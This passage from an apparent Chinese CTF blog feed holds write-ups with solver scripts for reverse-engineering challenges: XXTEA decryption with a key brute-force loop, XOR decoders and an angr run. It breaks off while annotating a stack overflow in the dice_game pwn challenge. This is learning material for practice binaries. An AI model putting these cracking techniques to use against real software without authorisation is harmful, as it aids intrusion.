class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="string">flagfan=[206,</span> <span class="number">188</span><span class="string">,</span> <span class="number">64</span><span class="string">,</span> <span class="number">165</span><span class="string">,</span> <span class="number">178</span><span class="string">,</span> <span class="number">244</span><span class="string">,</span> <span class="number">231</span><span class="string">,</span> <span class="number">178</span><span class="string">,</span> <span class="number">157</span><span class="string">,</span> <span class="number">169</span><span class="string">,</span> <span class="number">18</span><span class="string">,</span> <span class="number">18</span><span class="string">,</span> <span class="number">200</span><span class="string">,</span> <span class="number">174</span><span class="string">,</span> <span class="number">91</span><span class="string">,</span> <span class="number">16</span><span class="string">,</span> <span class="number">6</span><span class="string">,</span> <span class="number">61</span><span class="string">,</span> <span class="number">29</span><span class="string">,</span> <span class="number">215</span><span class="string">,</span> <span class="number">248</span><span class="string">,</span> <span class="number">220</span><span class="string">,</span> <span class="number">220</span><span class="string">,</span> <span class="number">112</span><span class="string">]</span></span><br><span class="line"><span class="string">l</span> <span class="string">=</span> <span class="string">[2,0,3,1,6,4,7,5,10,8,11,9,14,12,15,13,18,16,19,17,22,20,23,21]</span></span><br><span class="line"><span class="string">flagzhi=[0]*24</span></span><br><span class="line"><span class="string">flagzhii=''</span></span><br><span class="line"><span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(len(l)):</span></span><br><span class="line">    <span class="string">flagzhi[l[i]]=flagfan[i]</span></span><br><span class="line"><span class="string">print</span> <span class="string">flagzhi</span></span><br><span class="line"><span class="comment">#[188, 165, 206, 64, 244, 178, 178, 231, 169, 18, 157, 18, 174, 16, 200, 91, 61, 215, 6, 29, 220, 112, 248, 220]</span></span><br><span class="line"></span><br><span class="line"><span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(len(flagzhi)):</span></span><br><span class="line"><span class="string">flagzhii+=hex(flagzhi[i])+','</span></span><br><span class="line"><span class="string">print</span> <span class="string">flagzhii</span></span><br><span class="line"><span class="comment">#0xbc,0xa5,0xce,0x40,0xf4,0xb2,0xb2,0xe7,0xa9,0x12,0x9d,0x12,0xae,0x10,0xc8,0x5b,0x3d,0xd7,0x6,0x1d,0xdc,0x70,0xf8,0xdc,</span></span><br><span class="line"><span class="comment">#我们将  它整理下</span></span><br><span class="line"><span class="comment">#bca5ce40f4b2b2e7a9129d12ae10c85b3dd7061ddc70f8dc</span></span><br><span class="line"><span class="comment">#\xbc\xa5\xce\x40\xf4\xb2\xb2\xe7\xa9\x12\x9d\x12\xae\x10\xc8\x5b\x3d\xd7\x06\x1d\xdc\x70\xf8\xdc</span></span><br></pre></td></tr></table></figure><blockquote><p>现在 只需   将  上面得到的<br>“bca5ce40f4b2b2e7a9129d12ae10c85b3dd7061ddc70f8dc”<br>进行  xxTea  解密  即可   但 我们并不能知道  密钥（我们输入的前四位是什么!）</p></blockquote><blockquote><p>所以  两种  放式<br>1是  猜 是 flag<br>这种  其实  或许  更快，当然  ，在我们才对的情况下：</p></blockquote><p>这里附上  链接：<a href="https://github.com/xxtea/xxtea-python/blob/master/README_zh_CN.md" target="_blank" rel="noopener">https://github.com/xxtea/xxtea-python/blob/master/README_zh_CN.md</a></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">import xxtea</span><br><span class="line">key = <span class="string">"flag"</span></span><br><span class="line">encrypt_data = 'bca5ce40f4b2b2e7a9129d12ae10c85b3dd7061ddc70f8dc'.decode('hex')</span><br><span class="line">decrypt_data = xxtea.decrypt(encrypt_data, key)</span><br><span class="line">print decrypt_data</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;CXX_and_++tea&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>2.是爆破   //这里 参考了   上面链接 里的代码<br>写xxtea解密脚本就可以得到flag，这里有个问题，就是输入前四位为key，那并不知道key实际为多少，这里我想了一下其实有两个思路。第一就是猜测，既然是CTF，规定的格式一定为flag{xxxx}，所以前四位为flag，这点在后来也得到了验证，猜测是对的。第二种方法就是对前四位进行爆破，这里给出爆破脚本</p></blockquote><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># author: Prowes5</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import xxtea</span><br><span class="line"></span><br><span class="line">data1 = '<span class="symbol">\x</span>bc<span class="symbol">\x</span>a5<span class="symbol">\x</span>ce<span class="symbol">\x</span>40<span class="symbol">\x</span>f4<span class="symbol">\x</span>b2<span class="symbol">\x</span>b2<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>12<span class="symbol">\x</span>9d<span class="symbol">\x</span>12<span class="symbol">\x</span>ae<span class="symbol">\x</span>10<span class="symbol">\x</span>c8<span class="symbol">\x</span>5b<span class="symbol">\x</span>3d<span class="symbol">\x</span>d7<span class="symbol">\x</span>06<span class="symbol">\x</span>1d<span class="symbol">\x</span>dc<span class="symbol">\x</span>70<span class="symbol">\x</span>f8<span class="symbol">\x</span>dc'</span><br><span class="line">table = 'qwertyuiopasdfghjklzxcvbnm1234567890'</span><br><span class="line"></span><br><span class="line">for x in table:</span><br><span class="line">    for y in table:</span><br><span class="line">        for z in table:</span><br><span class="line">            for m in table:</span><br><span class="line">                key = x+y+z+m + "<span class="symbol">\x</span>00"*12</span><br><span class="line">                data = xxtea.decrypt(data1,key,padding = False)</span><br><span class="line">                #print data.encode('hex')</span><br><span class="line">                #print key</span><br><span class="line">                if data[0:4].encode('hex') == key[0:4].encode('hex'):</span><br><span class="line">                    print 'success'</span><br><span class="line">                    print 'key:'+key</span><br><span class="line">                    print 'flag:'+data</span><br><span class="line">                    raw_input()</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/KLIbfP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/02/KLIbfP.md.png" alt="KLIbfP.md.png"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;红帽杯的参加，发现自己，太多知识没有掌握了！记录下！&lt;br&gt;这里有个将 内存型数据 准转化为 正常型的代码！然后，对未知字符爆破的脚本，以及xxTea的快速解密代码！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>2019 湖湘杯 初赛</title>
    <link href="http://yoursite.com/2019/11/04/2019%20%E6%B9%96%E6%B9%98%E6%9D%AF%20%E5%88%9D%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/11/04/2019 湖湘杯 初赛/</id>
    <published>2019-11-04T14:58:36.000Z</published>
    <updated>2019-11-04T15:19:33.174Z</updated>
    
    <content type="html"><![CDATA[<p>上个周六，也就是前天，a木头战队合作着向着前600名冲分！</p><a id="more"></a><h2 id="赛中感受："><a href="#赛中感受：" class="headerlink" title="赛中感受："></a>赛中感受：</h2><blockquote><p>比赛系统是真卡，（或许是比赛的过多吧）:</p></blockquote><ul><li>“你的网络异常，请重新登陆”</li><li>“你已超时，已为你自动提交”</li><li>非法题目</li><li>比赛结束 得分93</li></ul><blockquote><p>额，昨晚就绝望了，谷歌都没能救得了我们！刚及格！93分/150分！</p></blockquote><h2 id="赛后感受："><a href="#赛后感受：" class="headerlink" title="赛后感受："></a>赛后感受：</h2><blockquote><p>赛后没什么感受，放弃关注它了，突然今天队友发来进复赛名单，哈哈，真爽！我们进去了！记录下这刺激时刻！</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/04/KzB3Rg.png" alt="KzB3Rg.png"></p><p><img src="https://s2.ax1x.com/2019/11/04/KzB1JS.png" alt="KzB1JS.png"><br><img src="https://s2.ax1x.com/2019/11/04/KzBli8.png" alt="KzBli8.png"><br>不过，进去就好！复赛加油！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上个周六，也就是前天，a木头战队合作着向着前600名冲分！&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf比赛" scheme="http://yoursite.com/tags/ctf%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2019 re00</title>
    <link href="http://yoursite.com/2019/11/03/UNCTF2019%20re00/"/>
    <id>http://yoursite.com/2019/11/03/UNCTF2019 re00/</id>
    <published>2019-11-03T08:13:03.000Z</published>
    <updated>2019-11-03T08:16:12.993Z</updated>
    
    <content type="html"><![CDATA[<p>打了场UNCTF，感觉自己好弱！</p><a id="more"></a><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><blockquote><p>这道是逆向签到题！没什么说的其实！<br>file 下<br><img src="https://s2.ax1x.com/2019/11/01/KTBAyQ.png" alt="KTBAyQ.png"><br>然后ida分析下</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#main函数：</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1E0h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+F0h] [rbp-F0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please Input Key: "</span>, <span class="number">0L</span>L);            <span class="comment">// </span></span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;v5);</span><br><span class="line">  encode(&amp;v5, (__int64)&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;v5) == key )                     <span class="comment">// 18</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, enflag) )                  <span class="comment">// izwhroz""w"v.K".Ni</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You are Right"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"flag&#123;This_1s_f4cker_flag&#125;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#encode函数</span><br><span class="line"><span class="comment">// 参数 1  我们输入的字符串（指针）    参数二   整数值</span></span><br><span class="line">int __fastcall encode(const char *a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  char v4[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  char v5[<span class="number">40</span>]; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  int v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  int i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  if ( strlen(a1) != <span class="type">key</span> )                      <span class="comment">// 18  字节</span></span><br><span class="line">    return puts(<span class="string">"Your Length is Wrong"</span>);</span><br><span class="line">  for ( i = <span class="number">0</span>; i &lt; <span class="type">key</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = <span class="type">key</span> ^ (a1[i] + <span class="number">6</span>);</span><br><span class="line">    v4[i + <span class="number">1</span>] = (a1[i + <span class="number">1</span>] - <span class="number">6</span>) ^ <span class="type">key</span>;</span><br><span class="line">    v3[i + <span class="number">2</span>] = a1[i + <span class="number">2</span>] ^ <span class="number">6</span> ^ <span class="type">key</span>;</span><br><span class="line">    *(_BYTE *)(a2 + i) = v5[i];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">1</span>LL) = v4[i + <span class="number">1</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">2</span>LL) = v3[i + <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  return a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接写脚本了，没什么说的！</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"></span><br><span class="line">enflag=<span class="string">'izwhroz""w"v.K".Ni'</span></span><br><span class="line">flagg=<span class="string">''</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">18</span>:</span><br><span class="line"></span><br><span class="line">flagg+=<span class="keyword">chr</span>((<span class="keyword">ord</span>(enflag[i])^<span class="number">18</span>)-<span class="number">6</span>)</span><br><span class="line">flagg+=<span class="keyword">chr</span>((<span class="keyword">ord</span>(enflag[i+<span class="number">1</span>])^<span class="number">18</span>)+<span class="number">6</span>)</span><br><span class="line">flagg+=<span class="keyword">chr</span>((<span class="keyword">ord</span>(enflag[i+<span class="number">2</span>])^<span class="number">18</span>)^<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">i+=<span class="number">3</span></span><br><span class="line"><span class="keyword">print</span> flagg</span><br><span class="line"><span class="comment">#unctf&#123;b66_6b6_66b&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Baby-XOR"><a href="#Baby-XOR" class="headerlink" title="Baby XOR"></a>Baby XOR</h2><blockquote><p>这题其实可以用动态工具，比如OD，flag会保存在栈中，所以说，即使不用一点分析就可以跑出来！但这里简单记录下！</p></blockquote><p>拖入ida中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST5C_4</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// ST6C_4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// ST68_4</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// ST64_4</span></span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// ST60_4</span></span><br><span class="line"></span><br><span class="line">  v0 = (<span class="keyword">void</span> *)sub_4010B4((<span class="keyword">int</span>)&amp;unk_4395F0, <span class="string">"世界上最简单的Xor"</span>);<span class="comment">// 输出    世界上最简单的Xor</span></span><br><span class="line">  sub_40107D(v0, (<span class="keyword">int</span>)sub_40102D);</span><br><span class="line">  <span class="keyword">if</span> ( --stru_436270._cnt &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _filbuf(&amp;stru_436270);                      <span class="comment">// 这个是   fil   应该是“失败”  所以 不要进入这个分支</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int8)*stru_436270._ptr;</span><br><span class="line">    ++stru_436270._ptr;</span><br><span class="line">  &#125;                                             <span class="comment">// str1='fmcd 7500k:&lt;; ' </span></span><br><span class="line">                                                <span class="comment">// v2='flag$2378b077-'</span></span><br><span class="line">  v2 = sub_40108C((<span class="keyword">int</span>)&amp;str1, <span class="number">0x38</span>);            <span class="comment">// str2='7o8b6|734v3bdz'</span></span><br><span class="line">  v3 = sub_401041((<span class="keyword">int</span>)&amp;str1, (<span class="keyword">int</span>)&amp;dword_435DF8, <span class="number">0x38</span>u);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);                           <span class="comment">// v3= 'qd6erk564-bdca'</span></span><br><span class="line">  v5 = <span class="built_in">strlen</span>(v3);                              <span class="comment">// v5=14</span></span><br><span class="line">  <span class="built_in">memcpy</span>(v4, v3, v5);                           <span class="comment">// v4=v3=  'qd6erk564-bdca'</span></span><br><span class="line">  v6 = sub_4010C3((<span class="keyword">int</span>)&amp;str1, (<span class="keyword">int</span>)v3, (<span class="keyword">int</span>)&amp;dword_435E30, <span class="number">0x38</span>);<span class="comment">// v6=  -o833mcea/.k9hqeecg:ede9a2&#125;</span></span><br><span class="line">  sub_40101E((<span class="keyword">int</span>)v2, (<span class="keyword">int</span>)v3, (<span class="keyword">int</span>)v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">str1=[0x66,0x6d,0x63,0x64,0x7f,0x37,0x35,0x30,0x30,0x6b,0x3a,0x3c,0x3b,0x20]</span><br><span class="line"><span class="attribute">v2</span>=<span class="string">''</span></span><br><span class="line"><span class="builtin-name">print</span> 56&gt;&gt;2#14</span><br><span class="line"><span class="attribute">i</span>=0</span><br><span class="line"><span class="keyword">while</span> i&lt;14:</span><br><span class="line">v2+=chr(str1[i]^i)</span><br><span class="line"><span class="attribute">i</span>=i+1</span><br><span class="line"><span class="builtin-name">print</span> v2#flag&#123;2378b077-</span><br><span class="line">str2=[0x37,0x6f,0x38,0x62,0x36,0x7c,0x37,0x33,0x34,0x76,0x33,0x62,0x64,0x7a]</span><br><span class="line"><span class="attribute">v3</span>=<span class="string">''</span></span><br><span class="line"><span class="attribute">i</span>=0</span><br><span class="line"><span class="keyword">while</span> i&lt;13:</span><br><span class="line">v3+=chr(str1[i]^str2[i]^str1[i-1])</span><br><span class="line"><span class="attribute">i</span>=i+1</span><br><span class="line"><span class="builtin-name">print</span> v3#qd6e-4564-bdc</span><br><span class="line"><span class="comment">#print len(v3)</span></span><br><span class="line">str3=[0x1a,0x0,0x0,0x51,0x5,0x11,0x54,0x56,0x55,0x59,0x1d,0x9,0x5d,0x12]</span><br><span class="line"><span class="builtin-name">print</span> len(str3)</span><br><span class="line"><span class="attribute">v6</span>=<span class="string">''</span></span><br><span class="line"><span class="attribute">i</span>=0</span><br><span class="line"><span class="keyword">while</span> i&lt;13:</span><br><span class="line">v6+=chr(str3[i+1]^ord(v3[i])^i)</span><br><span class="line"><span class="attribute">i</span>=i+1</span><br><span class="line"><span class="builtin-name">print</span> v6#qeec8eede9a2&#125;</span><br><span class="line"><span class="builtin-name">print</span> len(v6)</span><br><span class="line"><span class="builtin-name">print</span> v2+v3+v6#flag&#123;2378b077-qd6e-4564-bdcqeec8eede9a2&#125;</span><br></pre></td></tr></table></figure><h2 id="easy-VM"><a href="#easy-VM" class="headerlink" title="easy_VM"></a>easy_VM</h2><blockquote><p>angr真是个神器直接跑了出来！</p></blockquote><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">project=angr.Project(<span class="string">"./vm"</span>,auto_load_libs=False)</span><br><span class="line"></span><br><span class="line"><span class="keyword">state</span>=project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">simgr=project.factory.simgr(<span class="keyword">state</span>)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="number">0</span>x400BDA,avoid=<span class="number">0</span>x400B96)</span><br><span class="line"></span><br><span class="line">print(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/03/KXwX11.png" alt="KXwX11.png"></p><blockquote><p>flag：942a4115be2359ffd675fa6338ba23b6</p></blockquote><h1 id="后面会更新！"><a href="#后面会更新！" class="headerlink" title="后面会更新！"></a>后面会更新！</h1><blockquote><p>剩下的题目后面再更吧！今天还有做其他的一些事情！<br><img src="https://s2.ax1x.com/2019/09/27/uuZlh4.jpg" alt="uuZlh4.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;打了场UNCTF，感觉自己好弱！&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf比赛" scheme="http://yoursite.com/tags/ctf%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界进阶00</title>
    <link href="http://yoursite.com/2019/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B600/"/>
    <id>http://yoursite.com/2019/11/03/攻防世界进阶00/</id>
    <published>2019-11-03T07:48:33.000Z</published>
    <updated>2019-11-03T07:52:09.324Z</updated>
    
    <content type="html"><![CDATA[<p>之前已经做过了，但为了共享我尽量把他们放到这里上！这边大概涉及到如何python与C混合编程以及测变量在栈上偏移量的一种方法！</p><a id="more"></a><h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><h3 id="这个程序，有点长得不像pwn！"><a href="#这个程序，有点长得不像pwn！" class="headerlink" title="这个程序，有点长得不像pwn！"></a>这个程序，有点长得不像pwn！</h3><blockquote><p>下载下来是个压缩包，解压后里面是一个可执行文件以及一个libc.so.6动态链接库！</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXtaAs.png" alt="KXtaAs.png"></p><blockquote><p>然后checksec，</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXtdNn.png" alt="KXtdNn.png"></p><blockquote><p>fiile一波</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXttBQ.png" alt="KXttBQ.png"></p><blockquote><p>运行下：</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXtYng.png" alt="KXtYng.png"></p><blockquote><p>然后拖入ida查看字符串找到了srand以及经常和他在一起的time函数</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXtGjS.png" alt="KXtGjS.png"></p><h3 id="大致就是这样，我们分析下main-函数"><a href="#大致就是这样，我们分析下main-函数" class="headerlink" title="大致就是这样，我们分析下main()函数"></a>大致就是这样，我们分析下main()函数</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]            //偏移量：0x50字节</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]        //signed long int    8字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]    //unsigned long int   8字节</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);                       <span class="comment">//但它的空间只有0x30字节</span></span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0L</span>L);                  <span class="comment">//// 四字   即  8字节</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome, let me know your name: "</span>, a2);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);                   <span class="comment">// 所以这里存在栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )                               <span class="comment">// 交互  1</span></span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hi, %s. Let's play a game.\n"</span>, buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Game %d/50\n"</span>, v8);                 <span class="comment">// Game i/50   i初始为  1  循环  50次</span></span><br><span class="line">    v5 = sub_A20();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )                              <span class="comment">// v5 必须让他  等于  1  即sub_A20的返回值  为  1</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span 